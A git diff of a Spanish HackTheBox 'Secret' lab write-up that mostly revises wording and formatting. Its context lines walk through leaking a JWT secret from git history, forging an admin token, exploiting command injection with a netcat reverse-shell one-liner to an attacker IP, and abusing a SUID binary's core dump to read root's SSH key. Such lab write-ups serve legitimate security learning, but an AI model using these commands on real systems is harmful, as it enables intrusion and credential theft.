@@ -10,8 +10,8 @@ header:
   teaser: /assets/images/hackthebox/secret.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
-categories: [HACKTHEBOX, PENTESTING, WEB]
-tags: [API, JWT, SUID]
+categories: [HackTheBox, Pentesting, Web Exploiting, Privilege Escalation]
+tags: [API, JWT, CODE ANALYSIS, SUID, CORE DUMP]
 ---
 
 <p align="center"><img src="/assets/images/hackthebox/secret.png"></p>
@@ -129,7 +129,7 @@ Probemos con **`wfuzz`** a ver qué encontramos, primero con un diccionario pequ
 | --------- | :---------- |
 | -c        | Muestra el output en formato colorizado |
 | -w        | Utiliza el diccionario especificado |
-| --hc=404  | Oculta todos los códigos de estado 404 |
+| --hc 404  | Oculta todos los códigos de estado 404 |
 
 ```console
 p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://secret.htb/FUZZ 2>/dev/null
@@ -157,11 +157,11 @@ Filtered Requests: 4609
 Requests/sec.: 0
 ```
 
-Tenemos algo interesante, vemos un directorio **`api`**, así que vamos a revisar directamente la página web para obtener más información.
+Tenemos algo interesante, vemos un directorio **`api`**, así que vamos a revisar la página web para obtener más información.
 
 ![Website](/assets/images/hackthebox/secret/website.png)
 
-Una vez dentro lo primero que me llama la atención es que podemos descargar un archivo comprimido con nombre **`files.zip`**,
+Una vez dentro lo primero que me llama la atención es que podemos descargar un archivo con nombre **`files.zip`**,
 también nos hablan de una [API](https://es.wikipedia.org/wiki/Interfaz_de_programaci%C3%B3n_de_aplicaciones) y de tokens [JWT](https://es.wikipedia.org/wiki/JSON_Web_Token).
 Nos descargamos el .zip y lo descomprimimos:
 
@@ -188,7 +188,7 @@ Compressed: 28849603
 ```
 
 Al descomprimirlo nos crea un directorio **`local-web`**, donde se observa que es un repositorio git, del cual podemos extraer información con una serie de scripts para la ocasión.
-Para ello nos clonamos el siguiente repositorio: https://github.com/internetwache/GitTools
+Para ello nos clonamos el siguiente repositorio: **https://github.com/internetwache/GitTools**
 
 ```console
 p3ntest1ng:~$ ls -la local-web
@@ -226,7 +226,7 @@ drwxrwx--- root vboxsf 4.0 KB Fri Sep  3 07:57:09 2021  ..
 .rwxrwx--- root vboxsf 390 B  Fri Aug 13 06:42:59 2021  verifytoken.js
 ```
 
-El primero que analizo es **`auth.js`** y encuentro que en el proceso de login se crea el token JWT que va firmado con un **TOKEN_SECRET**
+El primero que analizo es **`auth.js`** y vemos que en el proceso de login se crea el token JWT que va firmado con un **TOKEN_SECRET**
 
 ```javascript
 ...[snip]...
@@ -270,7 +270,7 @@ drwxrwx--- root vboxsf   0 B  Fri Dec 31 01:12:09 2021  3-67d8da7a0e53d8fadeb
 Haciendo un **`ls -la`** de cada uno de estos directorios, vemos que existe un archivo **`.env`**, el cual normalmente se utiliza para almacenar variables TOKEN.
 Veamos qué contienen estos archivos:
 
-```
+```console
 p3ntest1ng:~$ catn dump/0-3a367e735ee76569664bf7754eaaade7c735d702/.env
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
 TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
@@ -385,6 +385,7 @@ const jwt = require("jsonwebtoken");
 
 Según este script de verificación, nuestro token debe estar firmado con el **`TOKEN_SECRET`** que encontramos anteriormente.
 Podemos hacer todo esto en la página **https://jwt.io/**
+<br/>
 Veamos cómo está construido nuestro JWT (algo que ya vimos en el ejemplo del apartado **`Login User`** en la documentación de la web).
 
 ![JSON Web Token](/assets/images/hackthebox/secret/jwt_token.png)
@@ -396,7 +397,7 @@ Finalmente firmamos el nuevo token con el TOKEN_SECRET y copiamos el JWT generad
 
 Volvamos a probar con este nuevo token para ver si es válido y nos loguea con privilegios.
 
-```
+```console
 p3ntest1ng:~$ curl -s -X GET "http://secret.htb:3000/api/priv" \
                 -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmYTQ5NTQyZTU5NjA0NWJjZTAzNWEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAcGVudGVzdGluZy5uZXQiLCJpYXQiOjE2NDgzMzg0MjV9.F4KOyd5y9h6hTc32fCP2eUHq89jQb2ZoW3hJDGJsScA" | jq
 {
@@ -408,7 +409,8 @@ p3ntest1ng:~$ curl -s -X GET "http://secret.htb:3000/api/priv" \
 }
 ```
 
-Perfecto, el sistema nos reconoce como administrador. Ahora vamos a analizar otro javascript, el archivo **`private.js`**
+Perfecto, el sistema nos reconoce como administrador. Ahora vamos a analizar otro JavaScript, el archivo **`private.js`**
+<br/>
 Si nos fijamos en esta parte, vemos que la ruta **`/logs`** es vulnerable a [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html):
 
 ```javascript
@@ -448,8 +450,8 @@ Por lo tanto vamos a ganar acceso generando una shell reversa que le pasaremos a
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.104 9999 >/tmp/f
 ```
 
-Primero vamos a encodearlo para evitar posibles problemas utilizando la web **https://www.urlencoder.io/**
-> **NOTA:** Se puede encodear como base64, no hay problema, yo lo he hecho así porque quería hacerlo de otro modo distinto a lo habitual.
+Primero vamos a "encodearlo" para evitar posibles problemas utilizando la web **https://www.urlencoder.io/**
+> **NOTA:** Se puede también como base64, no hay problema, yo lo he hecho así porque quería hacerlo de otro modo distinto a lo habitual.
 
 ```bash
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.104%209999%20%3E%2Ftmp%2Ff
@@ -507,7 +509,8 @@ dasith@secret:~/local-web$ sudo -l
 [sudo] password for dasith: 
 dasith@secret:~/local-web$ 
 ```
-En esta ocasión nos pide contraseña, por lo tanto pasamos directamente a la búsqueda de posibles [SUID](https://es.wikipedia.org/wiki/Setuid).
+
+Nos pide contraseña, por lo tanto pasamos directamente a la búsqueda de posibles [SUID](https://es.wikipedia.org/wiki/Setuid).
 
 ```console
 dasith@secret:~/local-web$ find / -type f -perm -u=s 2>/dev/null | grep -vE "snap|lib"
@@ -525,7 +528,7 @@ dasith@secret:~/local-web$ find / -type f -perm -u=s 2>/dev/null | grep -vE "sna
 /opt/count
 ```
 
-Lo primero que vemos es **`pkexec`**, podríamos aprovechar la vulnerabilidad y ganar acceso privilegiado ne cuestión de segundos.
+Lo primero que vemos es **`pkexec`**, podríamos aprovechar la vulnerabilidad y ganar acceso privilegiado en cuestión de segundos.
 
 ```console
 dasith@secret:~/local-web$ which pkexec | xargs ls -l
@@ -587,20 +590,20 @@ int main()
 
 Tras analizar esta parte del código (suprimí todo lo anterior por ser irrelevante), vemos que se está haciendo uso de [CoreDump](https://es.wikipedia.org/wiki/Volcado_de_memoria)
 
-##### ¿Pero qué hace exactamente Core Dump?
+#### ¿Pero qué hace exactamente Core Dump?
 > Cuando ocurre una excepción mientras el programa se está ejecutando, se guardan en un archivo los datos almacenados en memoria por el binario.
 
 Por lo tanto necesitamos provocar una excepción durante la ejecución de este programa para que sus datos queden volcados.
-Generalmente estos datos se guardan en la ruta **`/var/crash`**. Echemos un vistazo.
+Generalmente estos datos se guardan en la ruta **`/var/crash`**
 
 ```console
 dasith@secret:/opt$ ls /var/crash
 _opt_count.0.crash  _opt_countzz.0.crash
 ```
 
-Primero ejecutamos el binario, le pasamos por ejemplo **/root/root.txt** como ruta y hacemos Ctrl+Z para ponerlo en segundo plano.
+Primero ejecutamos el binario, le pasamos por ejemplo **/root/root.txt** como ruta y presionamos las teclas Ctrl+Z para dejarlo en segundo plano.
 
-##### Antes de la excepción:
+#### Antes de la excepción:
 ```console
 dasith@secret:/opt$ ./count
 Enter source file/directory name: /root/root.txt
@@ -613,17 +616,18 @@ Save results a file? [y/N]: ^Z
 dasith@secret:/opt$
 ```
 
-Ahora debemos buscar el PID del proceso y matarlo con **`kill`** enviando una señal BUS. Existen muchas otras señales, vamos a listarlas:
+Ahora tenemos que buscar el PID del proceso y matarlo con **`kill`** enviando una señal BUS.
+Existen muchas otras señales, vamos a listarlas:
 
 ```console
 dasith@secret:/opt$ kill -l
- 1) SIGHUP	    2) SIGINT	     3) SIGQUIT	     4) SIGILL	     5) SIGTRAP
- 6) SIGABRT	    7) SIGBUS	     8) SIGFPE	     9) SIGKILL	    10) SIGUSR1
+ 1) SIGHUP	     2) SIGINT	     3) SIGQUIT	     4) SIGILL	     5) SIGTRAP
+ 6) SIGABRT	     7) SIGBUS	     8) SIGFPE	     9) SIGKILL	    10) SIGUSR1
 11) SIGSEGV	    12) SIGUSR2	    13) SIGPIPE	    14) SIGALRM	    15) SIGTERM
 16) SIGSTKFLT	17) SIGCHLD	    18) SIGCONT	    19) SIGSTOP	    20) SIGTSTP
 21) SIGTTIN	    22) SIGTTOU	    23) SIGURG	    24) SIGXCPU	    25) SIGXFSZ
 26) SIGVTALRM	27) SIGPROF	    28) SIGWINCH	29) SIGIO	    30) SIGPWR
-31) SIGSYS	    34) SIGRTMIN	35) SIGRTMIN+1	36) SIGRTMIN+2	37) SIGRTMIN+3
+31) SIGSYS      34) SIGRTMIN	35) SIGRTMIN+1	36) SIGRTMIN+2	37) SIGRTMIN+3
 38) SIGRTMIN+4	39) SIGRTMIN+5	40) SIGRTMIN+6	41) SIGRTMIN+7	42) SIGRTMIN+8
 43) SIGRTMIN+9	44) SIGRTMIN+10	45) SIGRTMIN+11	46) SIGRTMIN+12	47) SIGRTMIN+13
 48) SIGRTMIN+14	49) SIGRTMIN+15	50) SIGRTMAX-14	51) SIGRTMAX-13	52) SIGRTMAX-12
@@ -632,7 +636,7 @@ dasith@secret:/opt$ kill -l
 63) SIGRTMAX-1	64) SIGRTMAX
 ```
 
-Estas señales se pueden especificar de tres formas:
+Estas señales se pueden especificar de tres formas (dependiendo del sistema):
 
 - Usando su valor numérico. (Ejemplo: **`kill -1`** o **`kill -s 1`**)
 - Usando el prefijo **SIG**. (Ejemplo: **`kill -SIGBUS`**)
@@ -658,7 +662,7 @@ dasith@secret:/opt$ ps
 
 Sigue estando ahí pero si nos volvemos a la sesión con **`fg`**, vemos que se ha producido el error.
 
-##### Después de la excepción:
+#### Después de la excepción:
 ```console
 dasith@secret:/opt$ fg
 ./count
@@ -711,10 +715,10 @@ p3ntest1ng:~$ strings CoreDump
 ...[snip]...
 ```
 
-Pero espera...tenemos la flag de root sin haber ganado una shell del sistema con todos los privilegios. Vamos a ello.
+Pero espera...no hemos conseguido una shell del sistema con todos los privilegios. Vamos a ello.
 
 Lo más fácil sería repetir el proceso anterior pero apuntando al archivo **`id_rsa`** ubicado en **`/root/.ssh/id_rsa`**
-Cuando logremos leer la clave privada, la volcamos a un archivo en nuestro sistema y ajustamos los permisos de dicho archivo con **`chmod 600 secretkey`**
+y cuando logremos leer la clave privada, la volcamos a un archivo en nuestro sistema y ajustamos los permisos de dicho archivo con **`chmod 600 secretkey`**
 
 ```console
 p3ntest1ng:~$ ssh -i secretkey 10.10.11.120
@@ -729,6 +733,6 @@ Y eso sería todo, espero que os haya gustado y como siempre:
 
 ### ¡Gracias por leer hasta el final!
 
-De esta máquina me ha gustado la progresión y la escalada de privilegios, ya que es algo que no había trabajado anteriormente y me ha servido para aprender sobre el Core Dump de binarios. Muy interesante.
+De esta máquina me ha gustado la progresión y la escalada de privilegios, ya que es algo que no había visto anteriormente y me ha servido para aprender sobre el Core Dump de binarios, algo muy interesante.
 
 #### Nos vemos en un próximo. ¡Feliz hacking! ☠
